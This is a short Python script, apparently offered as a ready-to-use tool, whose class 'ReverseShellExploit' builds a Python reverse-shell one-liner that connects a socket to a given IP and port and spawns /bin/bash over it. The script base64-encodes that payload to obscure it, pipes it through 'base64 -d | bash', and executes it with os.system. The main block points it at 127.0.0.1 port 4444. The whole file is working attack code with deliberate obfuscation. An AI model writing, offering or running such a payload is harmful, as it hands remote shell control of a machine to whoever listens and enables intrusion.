import os
import base64

class ReverseShellExploit:
    def __init__(self, target_ip, port=4444):
        self.target_ip = target_ip
        self.port = port
        print(f"[*] ReverseShellExploit initialized for target {self.target_ip} on port {self.port}")

    def generate_payload(self):
        """Generate a Python reverse shell payload."""
        payload = (
            f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{self.target_ip}\",{self.port}));os.dup2(s.fileno(),0);"
            f"os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        )
        print(f"[*] Generated payload: {payload}")

        encoded_payload = base64.b64encode(payload.encode()).decode()
        print(f"[*] Base64 encoded payload: {encoded_payload}")

        final_payload = f"echo {encoded_payload} | base64 -d | bash"
        return final_payload

    def execute(self):
        """Executes the reverse shell payload."""
        payload = self.generate_payload()
        print(f"[*] Executing obfuscated reverse shell payload: {payload}")
        os.system(payload)

if __name__ == "__main__":
    exploit = ReverseShellExploit("127.0.0.1", 4444)
    exploit.execute()
